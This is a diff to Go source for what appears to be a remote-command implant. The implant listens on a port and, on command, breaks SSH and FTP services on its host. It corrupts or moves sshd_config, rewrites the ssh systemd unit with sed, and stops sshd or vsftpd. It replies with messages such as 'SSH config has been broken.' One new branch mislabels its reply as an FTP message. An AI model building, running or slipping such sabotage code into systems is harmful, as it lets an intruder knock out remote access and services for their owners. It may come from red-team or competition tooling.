@@ -89,25 +89,37 @@ func EstablishConnection(port string) {
 					}
 					switch brks[0] {
 					case "ssh":
-						switch brks[1] {
-						case "alter-config":
-							ExecuteList([]string{
-								"echo asdf >> /etc/ssh/sshd_config",
-								"systemctl restart sshd",
-							})
-						case "move-config":
-							Execute(FormatCommand("mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old"))
-						case "break-service":
-						default:
-							if CheckService("sshd") {
-								Execute(FormatCommand("systemctl stop sshd"))
-							} else if CheckService("ssh") {
-								Execute(FormatCommand("systemctl stop ssh"))
-							} else {
-								respond("Error: ssh service not found\n", conn)
+						if CheckService("sshd") {
+							switch brks[1] {
+							case "alter-config":
+								ExecuteList([]string{
+									"echo asdf >> /etc/ssh/sshd_config",
+									"systemctl restart sshd",
+								})
+								respond("SSH config has been broken.\n", conn)
+							case "move-config":
+								Execute(FormatCommand("mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old"))
+								respond("SSH config moved.\n", conn)
+							case "break-service":
+								ExecuteList([]string{
+									"sed -i 's#/usr/sbin/sshd#/usr/bin/sshd#g' /lib/systemd/system/ssh.service",
+									"systemctl daemon-reload",
+									"systemctl restart sshd",
+								})
+								respond("FTP service file altered.", conn)
+							default:
+								if CheckService("sshd") {
+									Execute(FormatCommand("systemctl stop sshd"))
+								} else if CheckService("ssh") {
+									Execute(FormatCommand("systemctl stop ssh"))
+								} else {
+									respond("Error: ssh service not found\n", conn)
+								}
+								respond("SSH disabled.\n", conn)
 							}
+						} else {
+							respond("SSH service not found.\n", conn)
 						}
-						respond("SSH disabled.\n", conn)
 					case "http":
 						switch brks[1] {
 						default:
@@ -144,7 +156,7 @@ func EstablishConnection(port string) {
 									"systemctl daemon-reload",
 									"systemctl restart vsftpd",
 								})
-								respond("FTP service file altered.", conn)
+								respond("FTP service file has been broken.", conn)
 							default:
 								Execute(FormatCommand("systemctl stop vsftpd"))
 								respond("FTP disabled.\n", conn)
